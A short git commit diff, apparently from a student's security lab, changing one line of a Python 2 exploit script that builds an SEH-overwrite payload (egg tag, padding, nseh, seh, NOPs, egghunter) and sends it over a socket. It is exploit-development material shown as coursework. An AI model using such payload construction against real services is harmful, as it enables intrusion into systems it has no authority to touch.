cc091ca805e0d2cb5ecdcbf3c07a238c82669ac4
Dalton Ellis <dalton.ellis@trojans.dsu.edu>
2020-05-09 21:52:06 -0500

    upload

--- ellis_lab03.py
+++ ellis_lab03.py
@@ -95,7 +95,7 @@ shellcode = (
 
 # Shellcode length = 322 bytes
 # payload = "DaltDalt" + shellcode + nseh + seh + nops + eggh
-payload = "\n"+"DaltDalt" + "B"*222 + nseh + seh + nops + eggh
+payload = "\x00"+"DaltDalt" + "B"*222 + nseh + seh + nops + eggh
 socket.send(payload)
 d = socket.recv(1024)
 print d
